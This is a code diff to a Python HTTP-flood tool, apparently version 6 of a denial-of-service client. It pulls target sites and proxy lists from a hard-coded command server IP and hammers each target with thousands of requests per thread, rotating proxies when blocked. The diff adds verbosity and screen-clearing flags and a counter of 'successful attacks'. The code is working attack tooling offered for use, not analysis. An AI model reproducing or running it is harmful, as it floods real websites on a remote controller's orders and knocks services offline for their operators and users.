@@ -11,15 +11,21 @@ from time import sleep
 from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
 from json import loads
+from argparse import ArgumentParser
+import platform
 
 import json
 import sys
 
-VERSION = 5
+VERSION = 6
 HOSTS = ["http://46.4.63.238/api.php"]
 MAX_REQUESTS = 5000
 disable_warnings()
-def clear(): return system('cls')
+def clear():
+  if platform.system() == "Linux":
+    return system('clear')
+
+  return system('cls')
 
 
 logger.remove()
@@ -27,6 +33,14 @@ logger.add(
     stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
 threads = int(sys.argv[1])
 
+parser = ArgumentParser()
+parser.add_argument("-v", "--verbose", dest="verbose", action='store_true')
+parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
+parser.set_defaults(verbose=False)
+parser.set_defaults(no_clear=False)
+args, unknown = parser.parse_known_args()
+verbose = args.verbose
+no_clear = args.no_clear
 
 def checkReq():
     os.system("python3 -m pip install -r requirements.txt")
@@ -81,8 +95,15 @@ def mainth():
         site = unquote(data['site']['page'])
         if site.startswith('http') == False:
             site = "https://" + site
+
+        attacks_number = 0
+
         try:
+            if not verbose:
+              print('Atacking', end ='')
+
             attack = scraper.get(site)
+
             if attack.status_code >= 302:
                 for proxy in data['proxy']:
                     scraper.proxies.update(
@@ -91,15 +112,25 @@ def mainth():
                     if response.status_code >= 200 and response.status_code <= 302:
                         for i in range(MAX_REQUESTS):
                             response = scraper.get(site)
-                            logger.info("ATTACKED; RESPONSE CODE: " +
-                                        str(response.status_code))
+                            attacks_number += 1
+                            if verbose:
+                              logger.info("ATTACKED; RESPONSE CODE: " +
+                                          str(response.status_code))
+                            else:
+                              print('.', end ='')
             else:
                 for i in range(MAX_REQUESTS):
                     response = scraper.get(site)
-                    logger.info("ATTACKED; RESPONSE CODE: " +
-                                str(response.status_code))
+                    attacks_number += 1
+                    if verbose:
+                      logger.info("ATTACKED; RESPONSE CODE: " +
+                                  str(response.status_code))
+                    else:
+                      print('.', end ='')
+            if attacks_number > 0:
+              logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
         except:
-            logger.warning("issue happened")
+            logger.warning("issue happened, SUCCESSFUL ATTACKS: " + str(attacks_number))
             continue
 
 
@@ -107,12 +138,15 @@ def cleaner():
     while True:
         sleep(60)
         checkUpdate()
-        clear()
+
+        if not no_clear:
+          clear()
         collect()
 
 
 if __name__ == '__main__':
-    clear()
+    if not no_clear:
+      clear()
     checkReq()
     checkUpdate()
     for _ in range(threads):
